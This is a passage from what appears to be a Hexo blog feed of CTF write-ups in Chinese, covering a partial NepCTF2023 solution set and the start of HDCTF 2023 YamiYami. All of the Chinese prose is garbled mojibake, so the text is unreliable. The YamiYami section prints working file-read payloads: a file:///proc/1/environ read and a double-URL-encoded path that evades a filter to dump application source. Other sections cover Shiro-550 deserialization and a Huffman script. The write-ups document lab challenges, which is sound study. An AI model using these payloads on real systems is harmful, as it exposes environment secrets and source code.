$arguments)åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘<br>__get($pr,$value)ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®,å½“è°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è§¦å‘å¯¹è±¡æ‰€åœ¨ç±»çš„å®šä¹‰å¥½çš„__getæ–¹æ³•ï¼Œéœ€è¦return<br>__set($pr,$value)ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§,__setæ–¹æ³•çš„å‚æ•°æœ‰ä¸”åªèƒ½æ˜¯2ä¸ªï¼Œä¸€ä¸ªæ˜¯å±æ€§åï¼Œä¸€ä¸ªæ˜¯å±æ€§è¦è®¾ç½®çš„å€¼<br>__isset($pr)åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘<br>__unset($pr)åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘<br>__toString()æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘,éœ€è¦returnä¸€ä¸ªString<br>__invoke()å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘<br>__sleep()ä½¿ç”¨serializeæ—¶è§¦å‘,éœ€è¦return array();<br>__wakeup()ä½¿ç”¨unserializeæ—¶è§¦å‘<br><img src="/2023/08/24/%E6%88%91%E7%88%B1%E5%AD%A6ctf/image/v2-ed00ce07244a6e17948b0f713e880e82_r-1700990118619-49-1700994497396-23.jpg" alt="v2-ed00ce07244a6e17948b0f713e880e82_r"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2023--éƒ¨åˆ†Wp</title>
      <link href="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h1 id="NepCTF2023â€“éƒ¨åˆ†wp"><a href="#NepCTF2023â€“éƒ¨åˆ†wp" class="headerlink" title="NepCTF2023â€“éƒ¨åˆ†wp"></a>NepCTF2023â€“éƒ¨åˆ†wp</h1><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc:"></a>Misc:</h1><h2 id="Check-in"><a href="#Check-in" class="headerlink" title="Check in"></a>Check in</h2><p>NepCTF{H4ve_Fun_1N_This_Game}</p><h2 id="ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"><a href="#ä¸AIå…±èˆçš„å“ˆå¤«æ›¼" class="headerlink" title="ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"></a>ä¸AIå…±èˆçš„å“ˆå¤«æ›¼</h2><p>éœ€è¦åœ¨åŸæœ¬é™„ä»¶é‡Œè‡ªå¸¦çš„pyæ–‡ä»¶ä¿®æ”¹ä¸€ä¸‹å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HuffmanNode</span>:</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, char, freq</span>):</span><br><span class="line">    self.char = char</span><br><span class="line">    self.freq = freq</span><br><span class="line">    self.left = <span class="literal">None</span></span><br><span class="line">    self.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__lt__</span>(<span class="params">self, other</span>):</span><br><span class="line">    <span class="keyword">return</span> self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_tree</span>(<span class="params">frequencies</span>):</span><br><span class="line">  heap = [HuffmanNode(char, freq) <span class="keyword">for</span> char, freq <span class="keyword">in</span> frequencies.items()]</span><br><span class="line">  heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">len</span>(heap) &gt; <span class="number">1</span>:</span><br><span class="line">    left = heapq.heappop(heap)</span><br><span class="line">    right = heapq.heappop(heap)</span><br><span class="line">    merged = HuffmanNode(<span class="literal">None</span>, left.freq + right.freq)</span><br><span class="line">    merged.left = left</span><br><span class="line">    merged.right = right</span><br><span class="line">    heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_codes</span>(<span class="params">node, current_code, huffman_codes</span>):</span><br><span class="line">  <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    huffman_codes[node.char] = current_code</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  build_huffman_codes(node.left, current_code + <span class="string">&#x27;0&#x27;</span>, huffman_codes)</span><br><span class="line">  build_huffman_codes(node.right, current_code + <span class="string">&#x27;1&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">  frequencies = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> byte <span class="keyword">not</span> <span class="keyword">in</span> frequencies:</span><br><span class="line">      frequencies[byte] = <span class="number">0</span></span><br><span class="line">    frequencies[byte] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  root = build_huffman_tree(frequencies)</span><br><span class="line">  huffman_codes = &#123;&#125;</span><br><span class="line">  build_huffman_codes(root, <span class="string">&#x27;&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line">  compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">    compressed_data += huffman_codes[byte]</span><br><span class="line"></span><br><span class="line">  padding = <span class="number">8</span> - <span class="built_in">len</span>(compressed_data) % <span class="number">8</span></span><br><span class="line">  compressed_data += <span class="string">&#x27;0&#x27;</span> * padding</span><br><span class="line"></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    \<span class="comment"># Write frequency information</span></span><br><span class="line">    f.write(<span class="built_in">bytes</span>([<span class="built_in">len</span>(frequencies)]))</span><br><span class="line">    <span class="keyword">for</span> byte, freq <span class="keyword">in</span> frequencies.items():</span><br><span class="line">      f.write(<span class="built_in">bytes</span>([byte, (freq &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, freq &amp; <span class="number">0xFF</span>]))</span><br><span class="line"></span><br><span class="line">â€‹    \<span class="comment"># Write compressed data</span></span><br><span class="line">â€‹    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(compressed_data), <span class="number">8</span>):</span><br><span class="line">â€‹      byte = compressed_data[i:i+<span class="number">8</span>]</span><br><span class="line">â€‹      f.write(<span class="built_in">bytes</span>([<span class="built_in">int</span>(byte, <span class="number">2</span>)]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_tree_from_bytes</span>(<span class="params">frequencies</span>):</span><br><span class="line">  heap = [HuffmanNode(byte, freq) <span class="keyword">for</span> byte, freq <span class="keyword">in</span> frequencies.items()]</span><br><span class="line">  heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">len</span>(heap) &gt; <span class="number">1</span>:</span><br><span class="line">    left = heapq.heappop(heap)</span><br><span class="line">    right = heapq.heappop(heap)</span><br><span class="line">    merged = HuffmanNode(<span class="literal">None</span>, left.freq + right.freq)</span><br><span class="line">    merged.left = left</span><br><span class="line">    merged.right = right</span><br><span class="line">    heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    frequencies_count = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line"></span><br><span class="line">â€‹    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(frequencies_count):</span><br><span class="line">â€‹      byte = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">â€‹      freq = (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">24</span>) + (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">16</span>) + (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">8</span>) + <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">â€‹      frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">â€‹    root = build_huffman_tree_from_bytes(frequencies)</span><br><span class="line"></span><br><span class="line">â€‹    huffman_codes = &#123;&#125;</span><br><span class="line">â€‹    build_huffman_codes(root, <span class="string">&#x27;&#x27;</span>, huffman_codes)</span><br><span class="line">â€‹    reverse_huffman_codes = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> huffman_codes.items()&#125;</span><br><span class="line"></span><br><span class="line">â€‹    decompressed_data = <span class="built_in">bytearray</span>()</span><br><span class="line">â€‹    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">â€‹    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">â€‹      byte = f.read(<span class="number">1</span>)</span><br><span class="line">â€‹      <span class="keyword">if</span> <span class="built_in">len</span>(byte) == <span class="number">0</span>:</span><br><span class="line">â€‹        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">â€‹      byte = <span class="built_in">ord</span>(byte)</span><br><span class="line">â€‹      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">â€‹        <span class="keyword">if</span> byte &amp; (<span class="number">1</span> &lt;&lt; i):</span><br><span class="line">â€‹          code += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">â€‹        <span class="keyword">else</span>:</span><br><span class="line">â€‹          code += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">â€‹        <span class="keyword">if</span> code <span class="keyword">in</span> reverse_huffman_codes:</span><br><span class="line">â€‹          decompressed_data.append(reverse_huffman_codes[code])</span><br><span class="line">â€‹          code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decompressed_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  \<span class="comment"># input_file = &#x27;input.txt&#x27;</span></span><br><span class="line">  compressed_file = <span class="string">&#x27;compressed.bin&#x27;</span></span><br><span class="line">  decompressed_file = <span class="string">&#x27;decompressed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">  \<span class="comment"># å‹ç¼©æ–‡ä»¶</span></span><br><span class="line">  \<span class="comment"># compress(input_file, compressed_file)</span></span><br><span class="line"></span><br><span class="line">  \<span class="comment"># è§£å‹ç¼©æ–‡ä»¶</span></span><br><span class="line">  decompress(compressed_file, decompressed_file)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å°å®å¼¹é’¢ç´"><a href="#å°å®å¼¹é’¢ç´" class="headerlink" title="å°å®å¼¹é’¢ç´"></a>å°å®å¼¹é’¢ç´</h2><p>ä¸‹è½½æ‹¿åˆ°piano.binï¼Œæ˜¯ä¸ªéŸ³é¢‘æ–‡ä»¶ï¼Œæ‹‰è¿›Audacityçœ‹ä¸€ä¸‹ï¼Œå‘ç°æœ‰é¢‘è°±ï¼Œé€šè¿‡æ”¾å¤§ç¼©å°é¢‘è°±å‘ç°æœ‰å­—ç¬¦ä¸²ï¼Œå°†å­—ç¬¦ä¸²æŠ„å†™ä¸‹æ¥ï¼Œé’±ä¸€éƒ¨åˆ†æ˜¯æ‘©æ–¯å¯†ç ï¼Œåéƒ¨åˆ†æ˜¯16è¿›åˆ¶</p><blockquote><p>1011 111 001 000 0000 111 001 0100 100 001 000 0 1 0000 00 000 1 111 1001 111 010 000 111 11 0 1 0000 00 10 110</p></blockquote><p><strong>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</strong></p><p>å¯¹æ‘©æ–¯é¢è§£ç å‘ç°ï¼š</p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\blog2\themes\butterfly\source\img\image-20230812145240478.png"></p><p>YOUSHOULDUSETHISTOXORSOMETHING</p><p>æç¤ºåº”è¯¥æœ‰å¼‚æˆ–ï¼Œä½†æš‚æ—¶ä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œ</p><p>åæ¥è¯•äº†åŠå¤©ä¸16è¿›åˆ¶è½¬å­—ç¬¦ä¸²å¼‚æˆ–</p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\blog2\themes\butterfly\source\img\image-20230814161353554.png"></p><h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **en\</span><br><span class="line">viron;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (en\</span><br><span class="line">viron[i] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, en\</span><br><span class="line">viron[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é™Œç”Ÿçš„è¯­è¨€"><a href="#é™Œç”Ÿçš„è¯­è¨€" class="headerlink" title="é™Œç”Ÿçš„è¯­è¨€"></a>é™Œç”Ÿçš„è¯­è¨€</h2><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\blog2\themes\butterfly\source\img\QQå›¾ç‰‡20230813163223.jpg"></p><p>æ‰“å¼€å›¾ç‰‡ä¸€è„¸æ‡µï¼Œå‘ç°æœ‰ç‰¹æ®Šç¬¦å·ï¼Œé¢˜ç›®æè¿°è¯´</p><p>AåŒå­¦åœ¨å›å­¦æ ¡çš„è·¯ä¸Šæ¡åˆ°äº†ä¸€å¼ çº¸æ¡ï¼Œä½ èƒ½å¸®å¸®å¥¹å—ï¼Ÿ</p><p>flagæ ¼å¼ï¼šNepCTF{XX_XX}</p><p>hintï¼šAåŒå­¦çš„è‹±æ–‡åä¸ºâ€œAtsuko Kagariâ€</p><p>å»æœAtsuko Kagariâ€ï¼Œå‘ç°ä¸ºå°é­”å¥³å­¦å›­åŠ¨æ¼«å¥³ä¸»è§’ï¼Œå»çœ‹äº†åŠ¨æ¼«ï¼Œå‘ç°é‡Œé¢æœ‰ç€æ–‡å­—ï¼Œæ–°æœˆæ–‡å­—å’Œå¤é¾™è¯­ï¼Œå»ä¸Šç½‘æ‰¾è§£é‡Š</p><p>æ‰¾åˆ°</p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\blog2\themes\butterfly\source\img\QQå›¾ç‰‡20230813163230.jpg"></p><p>å¯¹åº”å†™å‡ºï¼ŒæŒ‰ç…§æ„Ÿè§‰æ·»åŠ ä¸‹åˆ’çº¿</p><blockquote><p>NepCTF{NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p></blockquote><h2 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h2><p>è¿™é“é¢˜å°±æ˜¯ä¸ªæ¸¸æˆï¼Œå°±æ˜¯è‡ªå·±å’Œæœºå™¨äººä¸‹æ£‹ï¼Œä½ è‡ªå·±å…ˆå…ˆè¿å‡ºæ¥42å’Œ5å­æ£‹å°±å¯å¾—åˆ°flagï¼Œä¸æƒ³åœ¨å¤ç°ä¸€éäº†ã€‚ã€‚ã€‚</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h2><p>é¢˜ç›®è¯´æ˜¯ä¸€ç§å¾ˆè€çš„cveï¼Œé¢˜ç›®åˆæ˜¯java-checkinï¼Œä¸Šç½‘æœï¼Œæ‰¾åˆ°ä¸€ä¸ªè·Ÿjavaæœ‰å…³å¾—cve</p><p>shiro550ååºåˆ—åŒ–æ¼æ´</p><p>åˆ©ç”¨å·¥å…·</p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/image/image-20230813164252615-1700990408076-211-1700994582910-185.png" alt="image-20230813164252615"></p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/image/image-20230813164322711-1700990408076-212-1700994582910-186.png" alt="image-20230813164322711"></p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/image/image-20230813164337799-1700990408076-213-1700994582910-187.png" alt="image-20230813164337799"></p><p>å¾—åˆ°flag</p><blockquote><p>NepcTF{Ezjava_Chekin}</p></blockquote><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="HRP-CHAT"><a href="#HRP-CHAT" class="headerlink" title="HRP-CHAT"></a>HRP-CHAT</h2><h3 id="HRP-CHAT-4"><a href="#HRP-CHAT-4" class="headerlink" title="HRP-CHAT-4"></a>HRP-CHAT-4</h3><p>å½“æ—¶æ‰“bossç»™ç³»ç»Ÿæ‰“å´©äº†å°±è¿›å…¥åˆ°äº†å®‰å…¨æ¨¡å¼ä½†æ˜¯å¾ˆæ‡µï¼Œæœ¬æ¥çœ‹ä»£ç ç›¸å‡º3çš„ï¼Œå°±å»çœ‹äº†ä¸€ä¸‹safebox.c,å‘ç°è¿™é‡Œé¢å¯ä»¥åå‡ºæ¥4flag</p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/image/image-20230814152239315-1700990408077-214-1700994582910-188.png" alt="image-20230814152239315"></p><p>è¾“å…¥Safe_Mode_Keyå³å¯å¾—å‡ºflag</p><h3 id="HRP-CHAT-3"><a href="#HRP-CHAT-3" class="headerlink" title="HRP-CHAT-3"></a>HRP-CHAT-3</h3><p>çœ‹servc.cæºç å‘ç°</p><p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/image/image-20230814153345494-1700990408077-215-1700994582910-189.png" alt="image-20230814153345494"></p><p>æ‰“è´¥bossTèƒ½å¤Ÿå¾—åˆ°flag</p><h1 id="é—®å·è°ƒæŸ¥"><a href="#é—®å·è°ƒæŸ¥" class="headerlink" title="é—®å·è°ƒæŸ¥"></a>é—®å·è°ƒæŸ¥</h1><p>NepCTF{See_you_in_NepCTF2024} </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> èµ›äº‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDCTF 2023-YamiYami</title>
      <link href="/2023/08/24/%5BHDCTF%202023%5DYamiYami/"/>
      <url>/2023/08/24/%5BHDCTF%202023%5DYamiYami/</url>
      
        <content type="html"><![CDATA[<h1 id="HDCTF-2023-YamiYami"><a href="#HDCTF-2023-YamiYami" class="headerlink" title="HDCTF 2023 YamiYami"></a>HDCTF 2023 YamiYami</h1><p>éé¢„æœŸè§£ï¼šè¿›å…¥é¢˜ç›®ç•Œé¢ç¬¬ä¸€ä¸ªç‚¹å¼€&#x2F;readè·¯ç”±è·³è½¬åˆ°ç™¾åº¦ï¼Œå‘ç°æœ‰æ–‡ä»¶è¯»å–ï¼Œç›´æ¥file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environè¯»å–ç¯å¢ƒå˜é‡å¾—flag</p><p>é¢„æœŸè§£ï¼š</p><p>åœ¨&#x2F;readè·¯ç”±å°è¯•è¯»app.pyå’Œflagå‘ç°è¢«æ­£åˆ™è¿‡æ»¤,urläºŒæ¬¡ç¼–ç app&#x2F;app.py:</p><p>è¿™é‡Œæœ‰urläºŒæ¬¡ç¼–ç å¯ç»•è¿‡è¿‡æ»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///%25%36%31%25%37%30%25%37%30%25%32%46%25%36%31%25%37%30%25%37%30%25%32%45%25%37%30%25%37%39</span><br></pre></td></tr></table></figure><p><img src="http://raw.githubusercontent.com/qingchuana/img/main/img/image-20230923155634248.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;[/read?url=https://baidu.com](view-source:http://node2.anna.nssctf.cn:28427/read?url=https://baidu.com)&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;[/upload](view-source:http://node2.anna.nssctf.cn:28427/upload)&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a 